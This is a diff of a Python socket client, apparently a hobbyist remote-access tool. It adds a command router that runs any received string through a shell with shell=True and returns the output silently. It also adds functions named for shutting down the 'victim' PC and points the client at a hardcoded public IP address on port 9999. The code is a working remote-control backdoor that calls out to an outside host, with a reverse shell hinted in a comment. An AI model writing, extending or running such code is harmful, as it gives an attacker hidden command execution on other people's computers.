@@ -6,7 +6,6 @@ import subprocess
 
 
 CLIENT_EXIT_CODE = '--exit--'
-
 class Status():
 
     def __init__(self, status):
@@ -200,6 +199,100 @@ class Connection():
         return self.socket.getpeername()
     
 
+
+
+class CommandRouter():
+
+    def __init__(self):
+        self._command_map = {
+        }
+
+    def verify_format(self, command):
+        value = (command[0] == "/" and len(command[1:]) > 0)
+        return value
+    
+    def extract_command_and_message(self, command):
+        slash = command[0]
+        name = ""
+        if(command.find(" ") != -1):
+            name = command[1:command.find(" ", 1)]
+            #print(name, "yes space")
+        
+        else:
+            name = command[1:len(command)]
+            #print(name, "no space")
+       
+        #name = name.replace(" ", "")
+        
+        if((name != None or name != "") and (slash == "/")):
+
+            return (slash+name, command[len(slash+name)+1:len(command)])
+        
+        return None
+        
+    def print_commands(self):
+        for command in self._command_map:
+            print(command)
+
+    def add_command(self, name, callback):
+        self._command_map[name] = callback
+        return True
+    
+
+    def remove_command(self, name):
+        return self._command_map.pop(name)
+
+    def contains_command(self, message):
+        value = self.extract_command_and_message(message)
+        if(value == None): return False
+        return True
+
+    def command_executor(self, message):
+        try:
+            data = self.extract_command_and_message(message)
+            if(data == None): return False
+            command_name = data[0]
+            command = data[1]
+            
+            #print(command_name +":"+command+":"+"fniallly")
+            response = self._command_map[command_name](command)
+            return response
+        
+        except Exception as error:
+            #print(" \x1b[31mcommand doesn't exists\x1b[0m", error)
+            return " \x1b[31mcommand doesn't exists\x1b[0m" + str(error)
+
+
+
+class CommandPrompt():
+
+    def __init__(self) -> None:
+        pass
+
+    def modify_directory(self, data):
+        
+        os.chdir(data)
+        currentWD = os.getcwd() + ">"
+        return currentWD
+    
+
+    def shutdown_victim_pc(self, data):
+        if(data == ""):
+            data = 10
+        command = "shutdown /s /t " + str(data)
+        return self.execute_generic(command)
+    
+    def cancel_shutdown_victim_pc(self, data):
+        command = "shutdown -a"
+        return self.execute_generic(command)
+    
+    def execute_generic(self, data):
+        cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        return output_str
+
+
 class WebClient():
 
     def __init__(self, name):
@@ -208,6 +301,14 @@ class WebClient():
         self.remote_address = None
         self.client_id = ComponentID('client_id', name)
         self.status = Status(False)
+
+        self.command_router = CommandRouter()
+        self.cmd = CommandPrompt()
+
+        self.command_router.add_command('/cd', self.cmd.modify_directory)
+        self.command_router.add_command('/cmd', self.cmd.execute_generic)
+        self.command_router.add_command('/shutdown', self.cmd.shutdown_victim_pc)
+        self.command_router.add_command('/cancelshutdown', self.cmd.cancel_shutdown_victim_pc)
         #self.shell = ReverseShell()
 
 
@@ -220,11 +321,12 @@ class WebClient():
         
         else:
             self.status.set_false()
-            print("[Web Client - " + self.client_id.read().name(), "is NOT active and disconnected")
+            print("[Web Client - " + self.client_id.read().name(), "] is NOT active and disconnected")
         return self
 
-    def process(self, data):
-        data = data[1:]
+    def process2(self, data):
+    
+        #cd command
         if data[:2] == 'cd':
             os.chdir(data[3:])
 
@@ -236,6 +338,13 @@ class WebClient():
             self.send_message(output_str + currentWD)
             #self.connection.send_data(str.encode(output_str + currentWD))
             #print(output_str)
+
+
+    def process(self, data):
+        response = self.command_router.command_executor(data)
+        if(response != False): self.send_message_invisibly(response)
+        else: self.send_message_invisibly("No command output")
+    
 
     def __reciever__(self):
 
@@ -267,7 +376,7 @@ class WebClient():
         status = None
         while((self.connection.active() == True) and (self.status.get() == True)):
             val = input()
-            if(val  == CLIENT_EXIT_CODE):
+            if(val == CLIENT_EXIT_CODE):
                 self.status.set_false()
                 self.connection.close()
                 break
@@ -283,6 +392,14 @@ class WebClient():
         return self
 
 
+
+    def send_message_invisibly(self, message):
+        val = None
+        if(self.connection.active() == True):
+            val = self.connection.send_data(message)
+            #print("[SENT]: ", message)
+        return val
+    
     def send_message(self, message):
         #Need to detect if the socket on the other side has gone, offline or clsoed
         val = None
@@ -298,23 +415,43 @@ class WebClient():
         if(self.connection.active()):
             message = self.connection.recieve_data()
         
+        #
+        if(message == None or message == "--Close Connection--"):
+            self.connection.close()
+            self.status.set_false()
+            return "Close flag"
+
         if(isinstance(message, bool) == False):
-            if(message[0] != '-'):print("[Recieved]: ", message)
+            if(message[0] == '-'):
+                self.connection.close()
+                self.status.set_false()
+            if(self.command_router.contains_command(message) == False):
+                print("[Recieved]: ", message)
+        
+        
         if(message!= None and isinstance(message, bool) == False): self.process(message)
-        print("[RECIEVED]:", message)
+
+
+        #print("[RECIEVED]:", message)
         return message
 
     def close(self):
-        self.status.set_false()
-        self.connection.close()
+        if(self.status.get() == True and self.connection.active() == True):
+            self.status.set_false()
+            self.connection.close()
+            print("Closed connection")
+            return
+        
+        print("Connection already was closed")
+        return
 
     def get_card(self):
         return self.client_id
 
 
 client = WebClient('Jaedon')
-client.connect_to('192.168.1.222', 9999).run()
-print("test", client.get_card().read().name())
+client.connect_to('38.56.129.131', 9999).run()
+print("Closing", client.get_card().read().name())
 client.close()
 
 #NOTE: 1) Needs multiclient support
